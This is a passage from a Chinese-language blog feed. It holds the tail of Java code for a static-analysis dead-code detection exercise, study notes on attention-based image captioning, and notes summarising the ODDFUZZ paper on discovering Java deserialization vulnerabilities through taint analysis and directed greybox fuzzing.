class="comment">// ensure deadcode branch entry</span></span><br><span class="line">                <span class="keyword">if</span> (is_true) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (Edge&lt;Stmt&gt; e: edges) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (e.getKind() == Edge.Kind.IF_FALSE) &#123;</span><br><span class="line">                            entry = e.getTarget();</span><br><span class="line">                            source_edge = e;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">for</span> (Edge&lt;Stmt&gt; e: edges) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (e.getKind() == Edge.Kind.IF_TRUE) &#123;</span><br><span class="line">                            entry = e.getTarget();</span><br><span class="line">                            source_edge = e;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// traverse branch and update deadcode set</span></span><br><span class="line">                Set&lt;Stmt&gt; deadcode_set_update = deadcodeSetFromEntry(source_edge, entry, cfg, deadCode);</span><br><span class="line">                deadCode.addAll(deadcode_set_update);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n <span class="keyword">instanceof</span> SwitchStmt) &#123;</span><br><span class="line">            <span class="comment">// get params p</span></span><br><span class="line">            <span class="type">Var</span> <span class="variable">p</span> <span class="operator">=</span> ((SwitchStmt) n).getVar();</span><br><span class="line">            Set&lt;Edge&lt;Stmt&gt;&gt; case_condition_edges = cfg.getOutEdgesOf(n);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// get p value using constant result</span></span><br><span class="line">            <span class="type">CPFact</span> <span class="variable">fact</span> <span class="operator">=</span> constants.getOutFact(n);</span><br><span class="line">            <span class="type">Value</span> <span class="variable">p_value</span> <span class="operator">=</span> fact.get(p);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* update deadcode set */</span></span><br><span class="line">            <span class="keyword">if</span> (p_value.isConstant()) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">p_constant_value</span> <span class="operator">=</span> p_value.getConstant();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// judge go CASE or DEFAULT</span></span><br><span class="line">                <span class="type">boolean</span> <span class="variable">exec_default</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">for</span> (Edge&lt;Stmt&gt; e: case_condition_edges) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (e.getKind() == Edge.Kind.SWITCH_CASE) &#123;</span><br><span class="line">                        <span class="type">int</span> <span class="variable">case_value</span> <span class="operator">=</span> e.getCaseValue();</span><br><span class="line">                        <span class="keyword">if</span> (p_constant_value == case_value)</span><br><span class="line">                            exec_default = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// update</span></span><br><span class="line">                <span class="keyword">for</span> (Edge&lt;Stmt&gt; e: case_condition_edges) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (e.getKind() == Edge.Kind.SWITCH_CASE) &#123;</span><br><span class="line">                        <span class="type">int</span> <span class="variable">case_value</span> <span class="operator">=</span> e.getCaseValue();</span><br><span class="line">                        <span class="comment">// maybe deadcode</span></span><br><span class="line">                        <span class="keyword">if</span> (p_constant_value != case_value) &#123;</span><br><span class="line">                            entry = e.getTarget();</span><br><span class="line">                            source_edge = e;</span><br><span class="line">                            <span class="comment">// traverse branch and update deadcode set</span></span><br><span class="line">                            Set&lt;Stmt&gt; deadcode_set_update = deadcodeSetFromEntry(source_edge, entry, cfg, deadCode);</span><br><span class="line">                            deadCode.addAll(deadcode_set_update);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (e.getKind() == Edge.Kind.SWITCH_DEFAULT &amp;&amp; !exec_default) &#123;</span><br><span class="line">                        entry = e.getTarget();</span><br><span class="line">                        source_edge = e;</span><br><span class="line">                        <span class="comment">// traverse branch and update deadcode set</span></span><br><span class="line">                        Set&lt;Stmt&gt; deadcode_set_update = deadcodeSetFromEntry(source_edge, entry, cfg, deadCode);</span><br><span class="line">                        deadCode.addAll(deadcode_set_update);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// judge not live and not call</span></span><br><span class="line">        <span class="keyword">if</span> (n <span class="keyword">instanceof</span> AssignStmt&lt;?,?&gt;) &#123;</span><br><span class="line">            Optional&lt;LValue&gt; def = n.getDef();</span><br><span class="line">            SetFact&lt;Var&gt; fact = liveVars.getOutFact(n);</span><br><span class="line">            <span class="keyword">if</span> (def.isPresent()) &#123;</span><br><span class="line">                <span class="type">LValue</span> <span class="variable">tmp</span> <span class="operator">=</span> def.get();</span><br><span class="line">                <span class="keyword">if</span> (tmp <span class="keyword">instanceof</span> Var) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!fact.contains((Var) tmp)) &#123;</span><br><span class="line">                        <span class="comment">// traverse branch and update deadcode set</span></span><br><span class="line">                        deadCode.add(n);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> deadCode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Set&lt;Stmt&gt; <span class="title function_">deadcodeSetFromEntry</span><span class="params">(Edge&lt;Stmt&gt; source_edge, Stmt entry, CFG&lt;Stmt&gt; cfg, Set&lt;Stmt&gt; cur_deadcode)</span> &#123;</span><br><span class="line">    Set&lt;Stmt&gt; deadcode_update = <span class="keyword">new</span> <span class="title class_">TreeSet</span>&lt;&gt;(Comparator.comparing(Stmt::getIndex));</span><br><span class="line">    Queue&lt;Stmt&gt; wl = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// judge entry is deadcode or not</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">entry_is_deadcode</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (source_edge != <span class="literal">null</span>) &#123;</span><br><span class="line">        Set&lt;Edge&lt;Stmt&gt;&gt; entry_in_edges = cfg.getInEdgesOf(entry);</span><br><span class="line">        <span class="keyword">for</span> (Edge&lt;Stmt&gt; in_e: entry_in_edges) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!in_e.equals(source_edge) &amp;&amp; !cur_deadcode.contains(in_e.getSource()))</span><br><span class="line">                entry_is_deadcode = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!entry_is_deadcode)</span><br><span class="line">        <span class="keyword">return</span> deadcode_update;</span><br><span class="line"></span><br><span class="line">    deadcode_update.add(entry);</span><br><span class="line">    wl.offer(entry);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// deadcode propogation</span></span><br><span class="line">    <span class="keyword">while</span> (!wl.isEmpty()) &#123;</span><br><span class="line">        <span class="type">Stmt</span> <span class="variable">cur</span> <span class="operator">=</span> wl.poll();</span><br><span class="line">        Set&lt;Edge&lt;Stmt&gt;&gt; edges = cfg.getOutEdgesOf(cur);</span><br><span class="line">        <span class="keyword">for</span> (Edge&lt;Stmt&gt; e: edges) &#123;</span><br><span class="line">            <span class="type">Stmt</span> <span class="variable">targ</span> <span class="operator">=</span> e.getTarget();</span><br><span class="line">            <span class="comment">// judge target is deadcode or not</span></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">targ_is_deadcode</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            Set&lt;Edge&lt;Stmt&gt;&gt; targ_in_edges = cfg.getInEdgesOf(targ);</span><br><span class="line">            <span class="keyword">for</span> (Edge&lt;Stmt&gt; te: targ_in_edges) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!e.equals(te) &amp;&amp; !cur_deadcode.contains(te.getSource()))</span><br><span class="line">                    targ_is_deadcode = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (targ_is_deadcode &amp;&amp; targ.getIndex() &lt; cfg.getIR().getStmts().size()) &#123;</span><br><span class="line">                deadcode_update.add(targ);</span><br><span class="line">                wl.offer(targ);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> deadcode_update;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;软件分析基础知识-amp-作业&quot;&gt;&lt;a href=&quot;#软件分析基础知识-amp-作业&quot; class=&quot;headerlink&quot; title=&quot;软件分析基础知识&amp;amp;作业&quot;&gt;&lt;/a&gt;软件分析基础知识&amp;amp;作业&lt;/h1&gt;&lt;p&gt;&amp;emsp;之前翔哥给我具体讲了讲软件分析的基础知识，翔哥的链接如下所示：&lt;/p&gt;
&lt;p&gt;[1] &lt;a href=&quot;https://xym4ster.github.io/post/Program-Analysis-01&quot;&gt;https://xym4ster.github.io/post/Program-Analysis-01&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[2] &lt;a href=&quot;https://xym4ster.github.io/post/Program-Analysis-02&quot;&gt;https://xym4ster.github.io/post/Program-Analysis-02&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[3] &lt;a href=&quot;https://xym4ster.github.io/post/Program-Analysis-03&quot;&gt;https://xym4ster.github.io/post/Program-Analysis-03&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[4] &lt;a href=&quot;https://xym4ster.github.io/post/Program-Analysis-04&quot;&gt;https://xym4ster.github.io/post/Program-Analysis-04&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[5] &lt;a href=&quot;https://xym4ster.github.io/post/Program-Analysis-05&quot;&gt;https://xym4ster.github.io/post/Program-Analysis-05&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="static-analysis" scheme="https://wd-2711.tech/categories/static-analysis/"/>
    
    
  </entry>
  
  <entry>
    <title>image-caption</title>
    <link href="https://wd-2711.tech/2023/11/09/image-caption/"/>
    <id>https://wd-2711.tech/2023/11/09/image-caption/</id>
    <published>2023-11-09T12:40:05.000Z</published>
    <updated>2023-12-04T12:22:48.010Z</updated>
    
    <content type="html"><![CDATA[<h1 id="image-caption-图像中文描述"><a href="#image-caption-图像中文描述" class="headerlink" title="image-caption: 图像中文描述"></a>image-caption: 图像中文描述</h1><p>数据集下载：<a href="https://tianchi.aliyun.com/dataset/145781?t=1699533627520">https://tianchi.aliyun.com/dataset/145781?t=1699533627520</a></p><span id="more"></span><h2 id="Show-Attend-and-Tell"><a href="#Show-Attend-and-Tell" class="headerlink" title="Show, Attend, and Tell"></a>Show, Attend, and Tell</h2><p>&emsp;这是一篇2021年的文章，用于生成图像的描述。利用卷积神经网络CNN提取图像特征，使用RNN将特征向量解码成语言序列。本论文在RNN（LSTM）上加入了attention机制，对图像特征的像素点进行概率估计，并加权求和，其思想为：人们在观察图像中倾向于关注有用信息。</p><p>&emsp;此文的贡献是：（1）提出了基于attention的image caption；（2）可视化了attention在每个时间上关注的点；（3）量化了加入attention机制后性能的提高。</p><h3 id="Encoder"><a href="#Encoder" class="headerlink" title="Encoder"></a>Encoder</h3><p>&emsp;VGGNet、Inception等是在大规模图像数据集（如ImageNet）上进行了预训练的模型，可以很好的提取到图像的特征。通过将最后的flatten与FC去掉，可以得到特征图。</p><h3 id="Decoder"><a href="#Decoder" class="headerlink" title="Decoder"></a>Decoder</h3><p>&emsp;使用LSTM，在每个时间step上生成词语。</p><p>&emsp;复习一下LSTM的知识：</p><p><img src="/images/image-caption/image-20231130205705945.png" alt="image-20231130205705945" style="zoom:67%;" /></p><p>&emsp;LSTM的输入为：$C<em>{t-1},h</em>{t-1},x_{t}$，输出为$C_t,h_t$。</p><p>&emsp;遗忘门：</p><p><img src="/images/image-caption/image-20231130205921504.png" alt="image-20231130205921504" style="zoom:67%;" /></p><p>&emsp;输出门（存储并更新细胞状态）：</p><p><img src="/images/image-caption/image-20231130205950447.png" alt="image-20231130205950447" style="zoom:67%;" /></p><p><img src="/images/image-caption/image-20231130205959664.png" alt="image-20231130205959664" style="zoom:67%;" /></p><p>&emsp;输出门：</p><p><img src="/images/image-caption/image-20231130210149692.png" alt="image-20231130210149692" style="zoom:67%;" /></p><p><img src="/images/image-caption/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%20(1).png" alt="未命名文件 (1)" style="zoom:67%;" /></p><h3 id="Attention"><a href="#Attention" class="headerlink" title="Attention"></a>Attention</h3><p>&emsp;作用是帮助生成LSTM中的$C<em>t$。利用CNN提取出的特征向量$a$与LSTM输出的$h</em>{t-1}$，通过FC+softmax计算每个像素点的概率值，之后对每个像素点加权求和，具体看下图。</p><p><img src="/images/image-caption/image-20231130220806283.png" alt="image-20231130220806283" style="zoom:80%;" /></p><p>To be continued…</p><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p>[1] <a href="https://github.com/foamliu/Image-Captioning-PyTorch">https://github.com/foamliu/Image-Captioning-PyTorch</a></p><p>[2] <a href="https://blog.csdn.net/qq_43152622/article/details/118755946">https://blog.csdn.net/qq_43152622/article/details/118755946</a></p><p>[3] <a href="https://github.com/dabasajay/Image-Caption-Generator">https://github.com/dabasajay/Image-Caption-Generator</a></p><p>[4] <a href="https://blog.csdn.net/sophicchen/article/details/103306545">https://blog.csdn.net/sophicchen/article/details/103306545</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;image-caption-图像中文描述&quot;&gt;&lt;a href=&quot;#image-caption-图像中文描述&quot; class=&quot;headerlink&quot; title=&quot;image-caption: 图像中文描述&quot;&gt;&lt;/a&gt;image-caption: 图像中文描述&lt;/h1&gt;&lt;p&gt;数据集下载：&lt;a href=&quot;https://tianchi.aliyun.com/dataset/145781?t=1699533627520&quot;&gt;https://tianchi.aliyun.com/dataset/145781?t=1699533627520&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="ML" scheme="https://wd-2711.tech/categories/ML/"/>
    
    
  </entry>
  
  <entry>
    <title>oddfuzz</title>
    <link href="https://wd-2711.tech/2023/11/07/oddfuzz/"/>
    <id>https://wd-2711.tech/2023/11/07/oddfuzz/</id>
    <published>2023-11-07T12:15:44.000Z</published>
    <updated>2023-11-29T14:51:26.937Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ODDFUZZ-Discovering-Java-Deserialization-Vulnerabilities-via-Structure-Aware-Directed-Greybox-Fuzzing"><a href="#ODDFUZZ-Discovering-Java-Deserialization-Vulnerabilities-via-Structure-Aware-Directed-Greybox-Fuzzing" class="headerlink" title="ODDFUZZ: Discovering Java Deserialization Vulnerabilities via Structure-Aware Directed Greybox Fuzzing"></a>ODDFUZZ: Discovering Java Deserialization Vulnerabilities via Structure-Aware Directed Greybox Fuzzing</h1><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>&emsp;可以用静态分析来定位java反序列化漏洞。ODDFUZZ使用轻量级污点分析定位候选的gadget链（避免漏报），之后使用定向灰盒测试生成poc用例来减少误报。ODDFUZZ使用结构感知种子生成方法保证用例有效性，并使用混合反馈与步进策略来指导定向模糊测试。</p><span id="more"></span><p>&emsp;找到ysoserial库34个漏洞中的16个（baseline 为3个），并在其他库中找到6个CVE。</p><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>&emsp;开放动态反序列化 OOD 具有破坏性（？），通过静态分析查找反序列化漏洞的工具有：（1）GadgetInspector，但是会有精度问题，从而产生漏报与误报；（2）SerHybrid，分析堆访问路径来寻找影响 sink 的 source。</p><p>&emsp;挑战：（1）精确率与召回率之间的权衡。由于java的运行时多态，任何重写的方法都可能变为gadget链，遍历所有可能的gadget链会使得路径爆炸，现有方法是使用污点分析剪枝，但是这种方法要么精度不行，要么计算代价太高。（2）现有fuzz生成的testcase都无法到达sink，生成有效的testcase需要多层级结构、且属性满足特定控制流约束。（3）现有方案以代码覆盖率为导向，而不是以目标为导向，就会浪费很多资源去找无法到达sink的path。</p><p>&emsp;ODDFUZZ贡献：（1）处理运行时多态时，对准确率与召回率之间进行权衡；（2）建模gadget链的数据约束，进行结构感知的fuzz；（3）使用step-forword策略与hybrid feedback，快速找到漏洞。</p><p>&emsp;使用java fuzz框架JQF来写ODDFUZZ。</p><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><h3 id="ODD"><a href="#ODD" class="headerlink" title="ODD"></a>ODD</h3><p>&emsp;开源动态反序列化ODD，又叫做对象注入漏洞OIV，指的是攻击者将序列化对象注入到应用程序的行为。ODD漏洞在js、php、.NET中也会有。open表示任意对象都可以被反序列化，dynamic表示能够调用invoke多态方法或基于反射的行为去找寻路径。由于java是动态的，所以很难预测会invoke哪个方法。攻击者可将应用程序的代码片段链接在一起（并按顺序执行它们）并将数据传递到安全敏感的调用点，攻击就成功。gadget链实例如下所示：</p><p><img src="/images/oddfuzz/image-20231108211644048.png" alt="image-20231108211644048" style="zoom:67%;" /></p><p>&emsp;面向属性的编程POP。精细的定义要反序列化的属性，以链接不同级别的对象，从而进行成功的攻击。下图是对上图的POP编程，通过构造的PriorityQueue，最后可进行代码的远程执行。</p><p><img src="/images/oddfuzz/image-20231108213655198.png" alt="image-20231108213655198" style="zoom:67%;" /></p><h3 id="威胁模型"><a href="#威胁模型" class="headerlink" title="威胁模型"></a>威胁模型</h3><p><img src="/images/oddfuzz/image-20231108213822316.png" alt="image-20231108213822316" style="zoom:67%;" /></p><h3 id="定向灰盒测试-DGF"><a href="#定向灰盒测试-DGF" class="headerlink" title="定向灰盒测试 DGF"></a>定向灰盒测试 DGF</h3><p>&emsp;以代码覆盖率为导向的灰盒测试（CGF）与定向灰盒测试（DGF）。对于某些场景，静态报告验证，漏洞就在那儿了，需要自己探索。DGF引导fuzzer到特定位置，并生成POC testcase。以下是DGF的流程：</p><p><img src="/images/oddfuzz/image-20231108214859002.png" alt="image-20231108214859002" style="zoom:67%;" /></p><p>&emsp;（1）静态分析阶段：提取调用图与控制流图，计算二进制文件与目标之间的距离。（2）fuzzing循环阶段，目标距离、覆盖率、相似性作为反馈信息，以快速引导fuzzer到达目标点。利用反馈信息，fuzzer在seed pool中选择seed，并分配适合的能量进行变异。seed的能量确定生成多少新种子。fuzzer使用多种变异策略来引导种子向目标站点进化。具有更小距离的新种子将被保留，以进行下一次fuzzing循环。</p><h2 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h2><h3 id="挑战1：运行时多态"><a href="#挑战1：运行时多态" class="headerlink" title="挑战1：运行时多态"></a>挑战1：运行时多态</h3><p>&emsp;现有的工作可以识别代码中gadget的组合，攻击者使用gadget来组合gadget链。由于运行时多态，无法根据声明类型确定虚拟方法调用，因此，无法精确找到运行时的程序路径，从而导致高漏报。解决此问题的方法是进行类层次分析（CHA），综合考虑显式与隐式方法调用，但是盲目的考虑所有可行的gadget会导致路径爆炸问题。</p><p>&emsp;gadgetInspector分别追踪了<code>函数参数</code>到<code>返回值、其他方法调用</code>的数据流，并列举了<code>基于类继承层次结构的所有可用方法</code>与<code>gadget链的相关函数重写</code>。然而，攻击者可控制的属性能够<code>从污点参数传播到其子类的参数</code>，这类情况gadgetInspector没有考虑，即没有考虑<code>过程内污点分析</code>。</p><p>&emsp;FUGIO在其构建的<code>深度有界调用树上追踪了过程内数据流</code>，以对不可行的gadget进行剪枝。然而，进行java ODD（开源动态反序列化）调用链发现时，这种方法不管用，这是因为传统java程序会集成很多个具有各自依赖关系的库，这会导致很多类和方法，使得调用链很深很宽，难以处理。</p><p><img src="/images/oddfuzz/image-20231109214851761.png" alt="image-20231109214851761" style="zoom:67%;" /></p><h3 id="挑战2：结构化的输入构建"><a href="#挑战2：结构化的输入构建" class="headerlink" title="挑战2：结构化的输入构建"></a>挑战2：结构化的输入构建</h3><p>&emsp;注入的对象一般都是由多个子对象构成的，通过POP编程，要求构造的对象在语法上可以反序列化，在语义上要满足一定的控制与数据流约束，从而使得gadget链可以实现有效的fuzz输入。如果没有复杂嵌套形式的对象结构的先验知识，那么很难构造出合适的fuzz case。</p><p><img src="/images/oddfuzz/image-20231111105100799.png" alt="image-20231111105100799" style="zoom:67%;" /></p><p>&emsp;一种方法是generation-based fuzz技术。SerHybrid执行points-to分析，以产生堆访问路径，该路径可以到达安全敏感点。对堆访问路径中未出现的字段属性分配随机值，以生成有效的注入对象，然后执行。然而，随着可用gadget链的增加，fuzzer不知道注入对象的多级类层次结构，因此很难对属性分配正确的值。例如，很难从Comparator的多种实现中选取适合的TransformingComparator。FUGIO基于候选的链生成了属性树，并通过启发式规则突变属性。但是，任意子类的随机组合语义上可能是无效的。</p><h3 id="挑战3：目标定向模糊测试"><a href="#挑战3：目标定向模糊测试" class="headerlink" title="挑战3：目标定向模糊测试"></a>挑战3：目标定向模糊测试</h3><p>&emsp;由于gadget链是由攻击者可控的方法组成的，这些方法在对象反序列化期间自动执行。常规代码覆盖率无法指导fuzzer，因为trigger很多code片段可能也无法到达sink点。</p><p>&emsp;本文没有追求最大的代码覆盖率，而是使用定向灰盒测试DGF来优先考虑接近sink的seed。之前的定向灰盒测试器计算种子执行轨迹上所有基本块距离的算数平均值，来调度种子，以快速达到sink。其问题是，种子距离是可能有偏差的，并且种子执行路径可能没有像想象中那样朝sink运行，对注入对象属性的修改可能会使执行路径发生巨大变化。因此，目标定向fuzz的feedback是很重要的。</p><h2 id="ODDFUZZ-设计"><a href="#ODDFUZZ-设计" class="headerlink" title="ODDFUZZ 设计"></a>ODDFUZZ 设计</h2><p><img src="/images/oddfuzz/image-20231114195459925.png" alt="image-20231114195459925" style="zoom:67%;" /></p><h3 id="A-总览"><a href="#A-总览" class="headerlink" title="A. 总览"></a>A. 总览</h3><p>&emsp;上图的program代表jar、war、class file，将其作为输入，并使用轻量级污点分析自动识别所有潜在的gadget链。之后，基于潜在的gadget链，生成结构感知的seed，以生成语义上有效的fuzz注入对象。在fuzzing loop阶段，oddfuzz结合前向突变策略与混合反馈（seed距离与gadget覆盖率）去引导fuzzer将注入对象突变，并到达sink。</p><h3 id="B-污点分析"><a href="#B-污点分析" class="headerlink" title="B. 污点分析"></a>B. 污点分析</h3><p>&emsp;如果有可利用的gadget链，那么进行污点分析，一定能从source到达sink。可以构建call graph（CG），来寻找可达的路径。然而，由于java运行时多态，虚函数调用无法被确定。因此，我们使用<code>轻量的基于摘要的污点分析，来标记可疑的gadget链</code>。</p><p>&emsp;<code>函数摘要的计算</code>。oddfuzz首先计算所有函数的静态摘要，具体来说，oddfuzz提取<code>函数参数与this作为其摘要</code>。之后，追踪方法中变量的传播，主要针对四种类型，<code>Assigin/Load/Store/Call</code>。<code>数据依赖于方法参数的变量也包含在方法摘要中</code>。这些摘要用于识别可利用的gadgets（gadget链上的点）。</p><p>&emsp;<code>gadget链的识别</code>。oddfuzz指定可利用的方法与敏感调用站点（sink）的列表，并基于上一步的函数摘要来识别可疑的链，在本文中指定了16种可利用的方法与30个sink（附录A）。（1）之后，由于gadgetInspector使用BFS（广度优先搜索），在不可行路径上遍历过的gadget就不会再考虑，从而导致漏报。而本文中，一旦在程序路径中找到前面标记过的可利用方法，那么就会从source gadget开始，基于方法摘要调用DFS，来找可利用的gadget链。（2）为了避免无休止循环，制定门限以规定链的最大深度。（3）为了处理java的运行时多态，使用层次结构分析CHA，仅当调用点被污染时，才会使用CHA，避免由于盲目考虑所有的gadget带来的路径爆炸问题。（4）oddfuzz的工作方式像普通的CG污点分析器。（5）所有来自于source的路径分析完成之后，就开始运行validator。借助轻量污点分析，可以平衡有效性（识别尽可能多的gadget链）与扩展性（可接受的时间开销）。</p><h3 id="C-结构感知的定向灰盒模糊测试"><a href="#C-结构感知的定向灰盒模糊测试" class="headerlink" title="C. 结构感知的定向灰盒模糊测试"></a>C. 结构感知的定向灰盒模糊测试</h3><p>&emsp;给一个java程序与候选gadget链，<code>oddfuzz使用结构感知的定向灰盒测试生成用于validation的可注入对象</code>。fuzzing loop算法在附录B的算法1中。</p><p>&emsp;<code>结构化种子生成</code>。生成语法上有效的注入对象需要：（1）设计反映gadget执行流的嵌套对象结构。（2）分配合适的属性值，方便到达sink。为此，设计了<code>结构感知的种子生成方法</code>，通过使用<code>属性树</code>的分层数据结构处理复杂的嵌套，其中<code>根节点代表一个保存多个gadget的类对象</code>。如下图所示，首先实例化gadget链涉及的类，并利用反射来收集类的可用属性，并构造属性树。</p><p><img src="/images/oddfuzz/image-20231114215527381.png" alt="image-20231114215527381" style="zoom:67%;" /></p><p>&emsp;具体来说，如果<code>属性树中节点的类型是对象，且此对象由另一个属性树表示，且此对象对应的类保存目标链的下一个gadget</code>，则我们通过连接此节点来合并两个属性树。并且，当属性树中某个字段节点的类型是另一个属性树的根节点（类对象）实现的接口时，两个属性树也会合并，如上图的 Comparator comparator 和 TransformingComparator 连接一样。</p><p>&emsp;当oddfuzz识别出可疑的 gadget 链（需要validate）时，它将被送入输入生成器以构造相应的属性树。<code>目标gadget链的多级类层次结构可以使用属性树很好地建模</code>。然后，fuzzer开始遍历属性树的主干，将其转换为用于fuzz的初始注入对象（上图右侧）。其他没有后继的属性节点（例如上图的Object[]）将被设置为null，以进行突变。</p><p>&emsp;<code>使用混合反馈来对种子的优先级进行排序</code>。对注入对象进行随机生成和变异不一定会到达sink，这种没有明确反馈指导的不确定性fuzz会使fuzzer退化为语义盲目的愚蠢模糊器。为了有效地选择和调度种子以到达sink，使用<code>混合反馈驱动的种子优先级排序方式</code>。即，为更接近sink的种子分配更多能量。oddfuzz考虑了两种类型的反馈指标：种子距离和gadget coverage。</p><p>（1）种子距离。计算种子距离以优先排序并安排种子以尽快到达sink是目标灰盒测试 DGF 的核心。种子s与sink所属的目标基本块$T_b$之间的距离计算为：</p><script type="math/tex; mode=display">d(s,T_b)=\frac{\sum_{m\in\xi(s)}d_b(m,T_b)}{|\xi(s)|}</script><p>&emsp;其中$d<em>{\boldsymbol{b}}(m,T</em>{\boldsymbol{b}})$是种子s执行轨迹中的基本块m与目标基本块$T_b$之间的距离。<code>我们不是枚举种子 s 执行路径上的所有基本块</code>，而是收集目标链的 gadget 内执行的基本块$\xi(s)$来计算种子距离，避免fuzzer探索不相关但更接近的路径。</p><p>（2）gadget coverage。使用此指标来优先考虑覆盖更多程序路径的种子。在最初的模糊测试阶段，gadget coverage旨在引导fuzzer选择不同的种子并对其进行优先级排序，避免因偏爱具有特定执行路径的某些种子而陷入局部最优。在power 分配阶段，<code>gadget coverage尝试为种子提供相同的距离，但覆盖更多的分支，从而提高突变的机会</code>。</p><p>&emsp;oddfuzz将所有生成的种子根据距离升序排序，并维护一个两级队列。第一个种子（或距离相同但覆盖范围不同的种子）将被放入优先队列中，其余种子将被放入较不优先队列中。因此，oddfuzz 有更大的机会从优先队列中选择下一个种子进行变异。至于power分配，oddfuzz使用如下方程，以便为所选种子输入分配适当的能量：</p><script type="math/tex; mode=display">p(s,T_b)=\psi(s)\cdot(1-\widetilde{d}(s,T_b))</script><p>&emsp;其中$\psi(s)$表示gadget coverage，并且$\widetilde{d}(s,T_b)=\frac{d(s,T_b)-minD}{maxD-minD}$是归一化种子距离。通过此方程，<code>fuzzer可以确定应用于当前种子的变异机会数量</code>，并评估在种子优先级排序过程中是否应优先考虑变异种子，从而在探索不同的执行路径和对种子进行优先级排序之间取得平衡。</p><p>&emsp;<code>前向种子突变</code>。以前的fuzz是通过位翻转等操作随机改变二进制文件来产生新的输入。然而，<code>当应用于结构化输入时，这种位突变可能会导致无效语法</code>。为了解决这个问题，我们利用 JQF（参数化模糊测试框架），它将结构化输入映射到一系列参数，以在位级别改变生成的种子。<code>参数上的这些位突变对应于结构化注入对象上的属性级突变</code>。然后，oddfuzz 应用前向种子突变策略来有效引导种子前往sink。</p><p>&emsp;具体来说，fuzzer首先遍历要变异的注入对象的属性树并检查每个属性的类型。对于<code>原始数据类型（例如 boolean、int），fuzzer使用 JQF 中的多种伪随机方法将无类型位参数转换为随机类型值；对于reference数据类型，fuzzer为特定类型定制目标模板；当类型为class时，fuzzer 将通过random.choose()方法从该属性的子类中随机选择一个类。对于数组属性，模糊器使用 random.nextInt() 方法随机设置数组大小，并根据元素类型（即继承数组类类型的实例）为数组分配随机值。</code>例如，从Fig.7.中的属性树生成的注入对象的参数序列为：</p><p><img src="/images/oddfuzz/image-20231115194857259.png" alt="image-20231115194857259" style="zoom:67%;" /></p><p>&emsp;上图的解释如下：为了改变属性 size 的值（类 PriorityQueue 中的 int 类型变量），fuzzer调用 random.nextInt() 方法来生成随机整数 1。为了生成对象数组队列，fuzzer调用方法random.choose() 从预定义的字典中为其分配一个实例对象，该对象由候选 gadget 链中所有类或方法涉及的一些特定属性值（例如类对象、字符串对象）组成。</p><p>&emsp;此外，为了引导种子走向sink，oddfuzz在位级别上改变感兴趣的注入对象的嵌套子对象。为此，我们使用 random.nextBool() 方法<code>将额外的标识符字节插入到注入对象的参数序列中</code>。当fuzzer在遍历属性树时遇到类对象节点时，fuzzer会添加一个字节作为标识符，以标记是否更改此嵌套子对象的属性值。我们利用fuzzer收集的gadget coverage来识别注入对象覆盖的最后一个分支所在的类，一旦注入对象被卡在某些gadget中（不按照链向下运行），fuzzer就会将相应的标识符字节设置为 